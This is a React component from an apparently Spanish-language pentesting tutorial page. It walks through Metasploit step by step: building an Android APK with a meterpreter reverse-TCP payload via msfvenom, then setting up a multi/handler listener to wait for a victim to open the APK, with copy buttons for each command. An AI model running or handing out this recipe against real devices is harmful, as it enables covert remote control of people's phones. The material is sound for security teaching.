/* eslint-disable react/no-unknown-property */
import { useState, useEffect } from 'react';

import Copy from '../assets/copy';
import Check from '../assets/check';

function Metasploit() {
  const [copy1, setCopy1] = useState(false);
  const [copy2, setCopy2] = useState(false);
  const [copy3, setCopy3] = useState(false);
  const [copy4, setCopy4] = useState(false);
  const [copy5, setCopy5] = useState(false);
  const [copy6, setCopy6] = useState(false);
  const [copy7, setCopy7] = useState(false);
  const [copy8, setCopy8] = useState(false);

  useEffect(() => {
    if (copy1 || copy2 || copy3 || copy4 || copy5 || copy6 || copy7 || copy8) {
      setTimeout(() => {
        setCopy1(false);
        setCopy2(false);
        setCopy3(false);
        setCopy4(false);
        setCopy5(false);
        setCopy6(false);
        setCopy7(false);
        setCopy8(false);
      }, 2000);
    }
  }, [copy1, copy2, copy3, copy4, copy5, copy6, copy7, copy8]);
  return (
    <section className="w-full px-8 lg:px-10 lg:pt-28 lg:mx-auto lg:max-w-7xl">
      <div className="space-y-12 md:text-left">
        <div className=" space-y-5 sm:mx-auto sm:space-y-4">
          <h2 className="pt-10 lg:pb-5 text-2xl font-black text-center text-white sm:text-6xl">
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 via-cyan-500 to-cyan-100">
              Metasploit
            </span>
          </h2>
          <h1 className="text-lg lg:text-3xl font-normal text-justify lg:text-center text-white pb-5">
            Metasploit es una herramienta de código abierto que proporciona a
            los desarrolladores y administradores de sistemas una plataforma
            para desarrollar, probar y explotar vulnerabilidades.
          </h1>

          <div className=" bg-zinc-900 p-4 lg:px-12 rounded-lg justify-between flex items-start shadow-lg">
            <code className="text-white text-sm lg:text-xl">
              <span className="text-zinc-500"># Ejecutar metasploit</span>
              <br />
              $ msfconsole
              <br />
              <span className="text-zinc-500">
                # Búsqueda de vulnerabilidad en la base de datos para su
                posterior ejecución
              </span>
              <br />
              msf {'>'} search easy
            </code>
            <div className="lg:block hidden">
              <button
                onClick={() => {
                  setCopy6(true);
                  navigator.clipboard.writeText('msfconsole');
                }}
                className="hover:bg-zinc-700 p-2 rounded-lg transition duration-0 hover:duration-150 delay-100"
              >
                {copy6 ? (
                  <Check className="fill-green-400" />
                ) : (
                  <Copy className="fill-zinc-400" />
                )}
              </button>
            </div>
          </div>
          <div className=" bg-zinc-900 p-4 lg:px-12 rounded-lg justify-between flex items-start shadow-lg">
            <code className="text-white text-sm lg:text-xl">
              <span className="text-zinc-500">
                # Utilización el exploit encontrado
              </span>
              <br />
              msf {'>'} use exploit/multi/handler
              <br />
              <span className="text-zinc-500"># Ver opciones del módulo:</span>
              <br />
              msf {'>'} Show options
            </code>
            <div className="lg:block hidden">
              <button
                onClick={() => {
                  setCopy7(true);
                  navigator.clipboard.writeText('msfconsole');
                }}
                className="flex hover:bg-zinc-700 p-2 rounded-lg transition duration-0 hover:duration-150 delay-100"
              >
                {copy7 ? (
                  <Check className="fill-green-400" />
                ) : (
                  <Copy className="fill-zinc-400" />
                )}
              </button>
            </div>
          </div>

          <div className=" bg-zinc-900 p-4 lg:px-12 rounded-lg justify-between flex items-start shadow-lg">
            <code className="text-white text-sm lg:text-xl">
              <span className="text-zinc-500"># Ver nuestra ip</span>
              <br />$ ifconfig
            </code>
            <div className="lg:block hidden">
              <button
                onClick={() => {
                  setCopy1(true);
                  navigator.clipboard.writeText('ifconfig');
                }}
                className="hover:bg-zinc-700 p-2 rounded-lg transition duration-0 hover:duration-150 delay-100"
              >
                {copy1 ? (
                  <Check className="fill-green-400" />
                ) : (
                  <Copy className="fill-zinc-400" />
                )}
              </button>
            </div>
          </div>
          <div className=" bg-zinc-900 p-4 lg:px-12 rounded-lg justify-between flex items-start shadow-lg">
            <code className="text-white text-sm lg:text-xl">
              <span className="text-zinc-500">
                # Usamos msfvenom para generar nuestra apk
              </span>
              <br />$ msfvenom -p android/meterpreter/reverse_tcp LHOST=ip
              LPORT=666 -o directorio/#.apk
            </code>
            <div className="lg:block hidden">
              <button
                onClick={() => {
                  setCopy2(true);
                  navigator.clipboard.writeText(
                    'msfvenom -p android/meterpreter/reverse_tcp LHOST=ip LPORT=666 -o directorio/#.apk'
                  );
                }}
                className="hover:bg-zinc-700 p-2 rounded-lg transition duration-0 hover:duration-150 delay-100"
              >
                {copy2 ? (
                  <Check className="fill-green-400" />
                ) : (
                  <Copy className="fill-zinc-400" />
                )}
              </button>
            </div>
          </div>
          <div className=" bg-zinc-900 p-4 lg:px-12 rounded-lg justify-between flex items-start shadow-lg">
            <code className="text-white text-sm lg:text-xl">
              <span className="text-zinc-500">
                # Creamos un archivo para ejecutar el payload con los siguientes
                comandos
              </span>
              <br />$ touch script
              <br />$ nano script
              <br />
            </code>
            <div className="lg:block hidden">
              <button
                onClick={() => {
                  setCopy3(true);
                  navigator.clipboard.writeText('touch script && nano script');
                }}
                className="hover:bg-zinc-700 p-2 rounded-lg transition duration-0 hover:duration-150 delay-100"
              >
                {copy3 ? (
                  <Check className="fill-green-400" />
                ) : (
                  <Copy className="fill-zinc-400" />
                )}
              </button>
            </div>
          </div>
          <div className=" bg-zinc-900 p-4 lg:px-12 rounded-lg justify-between flex items-start shadow-lg">
            <code className="text-white text-sm lg:text-xl">
              <span className="text-zinc-500">
                # Utilización el exploit anteriormente encontrado
              </span>
              <br />
              $ use exploit/multi/handler <br />
              <span className="text-zinc-500">
                # Usamos el payload para android
              </span>
              <br />
              $ set payload android/meterpreter/reverse_tcp <br />
              <span className="text-zinc-500">
                # Establecemos la ip y el puerto
              </span>
              <br />
              $ set LHOST ip <br />
              $ set LPORT 666 <br />
              <span className="text-zinc-500">
                # Ejecutamos el exploit y esperamos a que se conecte el
                dispositivo
              </span>
              <br />$ exploit
            </code>
            <div className="lg:block hidden">
              <button
                onClick={() => {
                  setCopy4(true);
                  navigator.clipboard.writeText(
                    'use exploit/multi/handler \n set payload android/meterpreter/reverse_tcp \n set LHOST ip \n set LPORT 666 \n exploit'
                  );
                }}
                className="hover:bg-zinc-700 p-2 rounded-lg transition duration-0 hover:duration-150 delay-100"
              >
                {copy4 ? (
                  <Check className="fill-green-400" />
                ) : (
                  <Copy className="fill-zinc-400" />
                )}
              </button>
            </div>
          </div>
          <div className=" bg-zinc-900 p-4 lg:px-12 rounded-lg justify-between flex items-start shadow-lg">
            <code className="text-white text-sm lg:text-xl">
              <span className="text-zinc-500">
                # Ejecutamos el script y esperamos a que la victima abra la apk
              </span>
              <br />$ msfconsole -r script
            </code>
            <div className="lg:block hidden">
              <button
                onClick={() => {
                  setCopy5(true);
                  navigator.clipboard.writeText('msfconsole -r script');
                }}
                className="hover:bg-zinc-700 p-2 rounded-lg transition duration-0 hover:duration-150 delay-100"
              >
                {copy5 ? (
                  <Check className="fill-green-400" />
                ) : (
                  <Copy className="fill-zinc-400" />
                )}
              </button>
            </div>
          </div>
          <div className="lg:pt-20 space-y-5 sm:mx-auto sm:space-y-4">
            <h2 className="pt-10 pb-5 text-2xl font-black text-center text-white sm:text-6xl">
              <span className="text-transparent bg-clip-text bg-gradient-to-r from-amber-300 via-amber-500 to-amber-200">
                Fase 4: Informes de resultados
              </span>
            </h2>
            <h1 className="text-lg lg:text-3xl font-normal text-justify lg:text-center text-white pb-5">
              Etapa en la que se realizan informes o reportes de los resultados
              de la auditoria o los tests de pentesting realizados. Se enmarca
              la importancia de las vulnerabilidades encontradas y los riesgos
              que conllevan la no corrección o reparación de las mismas.
            </h1>
            <div>
              <h2 className="lg:pt-10 pb-10 text-2xl font-black text-white sm:text-6xl">
                <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-blue-500 to-blue-200">
                  Informe Ejecutivo:
                </span>
              </h2>
              <h2 className="lg:pt-10 pb-10 text-2xl font-black text-white sm:text-6xl">
                <span className="text-transparent bg-clip-text bg-gradient-to-r from-blue-400 via-blue-500 to-blue-200">
                  Informe Técnico:
                </span>
              </h2>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}

export default Metasploit;
